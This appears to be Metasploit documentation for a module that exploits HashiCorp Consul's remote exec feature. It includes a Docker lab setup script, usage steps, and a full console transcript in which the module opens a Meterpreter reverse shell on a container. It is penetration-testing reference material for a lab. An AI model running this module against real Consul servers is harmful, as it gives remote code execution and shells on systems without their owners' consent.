## Vulnerable Application

[HashiCorp Consul](https://www.consul.io/) with `disable_remote_exec` configuration flag set to false (default configuration up to version 0.8, opt-in since version 0.9).

### Description

This module exploits a feature of Hashicorp Consul named rexec.

The exec command provides a mechanism for remote execution. For example, this can be used to run the uptime command across all machines providing the web service.

The exposure of rexec service depends on the `disable_remote_exec` option. This option was set to true starting from Consul 0.8, to make remote exec opt-in instead of opt-out.

### Test setup

The following bash script can be used to setup a testing environment with Docker:

```
#!/bin/sh

echo "[+] Launching consul instances..."
BOOTSTRAP_ID=`docker run -p8301:8301 -d --name=consul_bootstrap_server consul:latest agent -server -client=0.0.0.0 -bootstrap -data-dir /tmp/consul`
sleep 2
BOOTSTRAP_IP=`docker inspect --format '{{ .NetworkSettings.IPAddress }}' $BOOTSTRAP_ID`
docker run -d --name=consul_client_1 -e 'CONSUL_LOCAL_CONFIG={"leave_on_terminate": true, "enable_script_checks":true, "disable_remote_exec":false}' consul:latest agent -ui -client=0.0.0.0 -retry-join=$BOOTSTRAP_IP
echo "[+] Checking members..."
docker exec -t consul_bootstrap_server consul members -http-addr="$BOOTSTRAP_IP:8500"
```

You should observe something similar to the excerpt below when running the script:

```
sudo ./launch.sh
[+] Launching consul instances...
d28e7cf476ff2f148cad81a0b1959a7c67591c2e348c6172b6f463af66d1eb9a
[+] Checking members...
Node          Address          Status  Type    Build  Protocol  DC   Segment
38a7c1d93e7f  172.17.0.1:8301  alive   server  1.4.0  2         dc1  <all>
d28e7cf476ff  172.17.0.2:8301  alive   client  1.4.0  2         dc1  <default>
```

The following bash script can be used to stop and destroy **all your consul containers** (so be careful if you use consul containers for other things at the same time):

```
#!/bin/sh
for h in `sudo docker ps -a | grep consul | cut -d' ' -f1`; do docker stop $h && docker rm $h; done
```

## Verification Steps

You can verify the module against the vulnerable application with those steps:

  1. Launch a Consul cluster with the provided bash script
  2. Start msfconsole
  3. Do: `use exploit/multi/misc/consul_rexec_exec`
  4. Do: `set RHOST ip_of_consul_container`
  5. Do: `set RPORT 8500`
  6. Do: `check`. The target should appear vulnerable.
  7. Do: `set payload` with the payload of your choosing.
  8. Do: `set LHOST 172.17.42.1` (docker0 gateway IP)
  9. Do: `run`
  10. You should get a shell.

## Scenarios

### Reverse shell on Linux host

Exploit running against a Docker [consul](https://hub.docker.com/_/consul/) container target:

```
msf5 > use exploit/multi/misc/consul_rexec_exec
msf5 exploit(multi/misc/consul_rexec_exec) > set RHOSTS 172.17.0.4
RHOSTS => 172.17.0.4
msf5 exploit(multi/misc/consul_rexec_exec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/misc/consul_rexec_exec) > set LHOST 172.17.42.1
LHOST => 172.17.42.1
msf5 exploit(multi/misc/consul_rexec_exec) > check
[+] 172.17.0.4:8500 The target is vulnerable.
msf5 exploit(multi/misc/consul_rexec_exec) > run

[*] Started reverse TCP handler on 172.17.42.1:4444
[*] Creating session.
[*] Got rexec session ID b39ba52e-848d-9dc4-dc1e-e84760062335
[*] Setting command for rexec session b39ba52e-848d-9dc4-dc1e-e84760062335
[*] Triggering execution on rexec session b39ba52e-848d-9dc4-dc1e-e84760062335
[*] Sending stage (861480 bytes) to 172.17.0.4
[*] Cleaning up rexec session b39ba52e-848d-9dc4-dc1e-e84760062335
[*] Command Stager progress - 115.73% done (883/763 bytes)

meterpreter > sysinfo
Computer     : 172.17.0.4
OS           :  (Linux 4.4.0-38-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.17.0.4 - Meterpreter session 1 closed.  Reason: User exit
```
